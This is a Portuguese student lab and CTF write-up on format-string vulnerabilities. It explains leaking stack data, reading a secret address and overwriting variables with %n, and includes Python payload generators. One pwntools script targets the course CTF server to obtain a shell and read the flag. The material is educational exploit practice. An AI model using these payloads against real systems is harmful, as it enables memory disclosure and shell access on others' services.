# Trabalho realizado na Semana #6

## Task 1
O programa `format.c` contém uma `format-string vulnerability` na função `myprintf`.
Se a string passada como pârametro para a função contiver `format specifiers`, dado que o printf não contêm argumentos, poderá crashar o programa ao tentar aceder a endereços de memória. 

Para tentar crashar o programa, foram mandados, através do script, os seguintes inputs ao servidor:
1. `"%d"` não crasha o programa
2. `"%x"` não crasha o programa
3. `"%s"` crasha o programa
4. `"%n"` crasha o programa

No 1. e 2. o printf vai buscando os valores à stack. Não crashou o programa pois não acedeu a endereços de memória privados ou inexistentes mas esta vulnerabilidade pode ser utilizada para obter informações sobre os valores na stack.

No 3. e 4. os `format specifiers` acedem a endereços de memória específicos. `%n` e `%s` vão buscar um valor à stack, encarando-o como endereço no qual vão escrever e ler, respetivamente. Como este endereço não existe - `lixo` -, ocorre segmentation fault.

## Task 2
### A 
O número de `%x` que precisamos é 64, se passarmos como input `"abcd" + 64 * "%x"`, `abcd` é impresso novamente no ecrã.

### B
Para obtermos a _secret message_, usamos o mesmo raciocínio que o da alínea anterior, mas desta vez para o conteúdo de um endereço.
Para tal, a informação escrita no ficheiro é: `0x80b4008` + `{63}%x` + `%s`, onde `0x80b4008` é o endereço da _secret message_.
Deste modo, o format specifier `%s`, vai aceder ao próximo endereço da stack e vai imprimir o seu conteúdo no ecrã. Assim vamos conseguir imprimir aquilo que se encontra no endereço `0x80b4008`, pois já concluimos que este será o próximo endereço a ser lido.

#### Código utilizado para gerar o badfile passado como input
~~~python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x80b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   63 of "%.8x", concatenated with a "%s"
s = 63*"%.8x"+"%s"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)    
~~~

## Task 3
Nesta tarefa, tal como nas anteriores, tivemos de aceder a um endereço específico: `0x80e5068` (endereço de _target variable_). Porém, desta vez, teremos de escrever para o endereço em vez de apenas lê-lo. A forma que arranjamos para concluir esta tarefa, foi através do _format specifier_ `%n` que escrever para o endereço alvo a quantidade de bytes que imprimiu. Assim, coube-nos arranjar forma de conseguir imprimir 20480 bytes (`0x5000` em hexadecimal) no ecrã, considerando que o tamanho máximo de `buffer` era 1500.
Para isto, com apoio de um ficheiro python, enviamos como input para o programa, `0x80e5068` + `63*"%.325x"`+ `"t"` + `"%n"`, que levou a que o programa imprimisse todos os endereços com 325 bytes (`325*63 (63 endereços da stack até chegar ao 0x80e5068) + 4 (0x80e5068) + 1 (t) = 20480 (0x5000)`).
#### Código utilizado para gerar o badfile passado como input
~~~python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x80e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   63 of "%.8x", concatenated with a "t", concatenated with a "%n"
s = 63*"%.325x"+ "t" + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)   
~~~~

## CTF

### Desafio 1
Após analisar o código conseguimos perceber que a linha 27 do programa contém uma `Format String Vulnerability`. Ultilizamos o gdb para descobrir o endereço da variável global (`0x804c060`), e utilizamos a string de input "abcd%x%x%x%x..." para descobrir onde se situa na stack a variável `buffer` de seguida só precisamos de criar uma string com o endereço da flag no início seguido de %s de forma a imprimi-la na consola.
O seguinte script cria o ficheiro que foi usado como input para econtrar a flag
``` py
#!/usr/bin/python3
import sys

# Initialize the content array
N = 32
content = bytearray(0x0 for i in range(N))

# This line adds the buffer address to the content
number  = 0x804c060
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# The line adds the string to the content
s = "%s"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to file
with open('file', 'wb') as f:
  f.write(content)
```

### Desafio 2
Após analisar o código conseguimos que a linha 14 do programa contém uma `Format String Vulnerability`, e que o nosso objetivo é entrar no if da linha 17 de forma a termos acesso à `bash`, ou seja, temos de alterar a variável key de forma a que esta seja igual a `0xbeef`. De novo corremos o gdb para encontrar o endereço de key (`0x804c034`), e também corremos o programa com a string "abcd%x%x%x%x..." para saber a posição do buffer na stack. Precisamos então de utilizar o `%n` para alterar o valor de key, ou seja precisamos de imprimir `48879` caracteres e depois ter o %n para escrever na variavel. Para isso colocamos o endereço duas vezes no inicio da string, seguidas de `"%48871s%n"`. O que acontece é que o programa imprime duas vezes o endereço (8 bytes) mais a string que está alojada em `0x804c034` em 48871 bytes prefazendo um total de `48879` bytes que depois é escrito
no endereço que desejamos.

```py
from pwn import *  
p = remote("ctf-fsi.fe.up.pt", 4005)

#!/usr/bin/python3
import sys

# Initialize the content array
N = 32
content = bytearray(0x0 for i in range(N))

# This line stores the two variables
number  = 0x804c034
content[0:4]  =  (number).to_bytes(4,byteorder='little')
number  = 0x804c034
content[4:8]  =  (number).to_bytes(4,byteorder='little')

# This line stores the string and the %n
s = "%48871s%n"
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

p.sendline(content)
p.interactive()
```

Após correr este script a flag é conseguida com `cat flag.txt`